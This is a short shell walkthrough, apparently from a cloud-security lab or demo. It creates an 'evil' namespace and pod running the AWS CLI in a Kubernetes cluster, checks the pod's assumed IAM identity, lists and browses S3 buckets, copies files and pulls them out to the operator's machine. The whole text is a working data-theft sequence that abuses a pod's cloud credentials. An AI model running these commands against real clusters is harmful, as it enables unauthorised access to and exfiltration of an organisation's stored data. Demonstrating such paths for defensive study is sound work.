#  Create namespace and "evil" pod
kubectl --context aws create ns evil
cat <<EOF | kubectl --context aws apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: evil-aws-cli
  namespace: evil
spec:
  containers:
  - name: evil-aws-cli
    image: public.ecr.aws/aws-cli/aws-cli:2.22.28
    command: [ "/bin/bash", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
    env:
      - name: AWS_PAGER
        value: ""
      - name: DEPLOYMENT_ID
        value: "$(dm-deployment-id-aws)"
EOF

kubectl --context aws -n evil get pods

kubectl --context aws exec --stdin --tty -n evil evil-aws-cli  -- /bin/bash

# Check identity and assumed role
aws sts get-caller-identity

#list the account's S3 buckets
aws s3api list-buckets

# Browse bucket
aws s3 ls s3://<bucket-name>
aws s3 ls s3://<bucket-name>/dir/

# Copy files that you want
aws s3 cp s3://<bucket-name>/dir/file.pdf ~/tmp/

# load file from container to your machine
kubectl exec -n evil evil-aws-cli -- cat /tmp/file.pdf  > ~/tmp/file.pdf
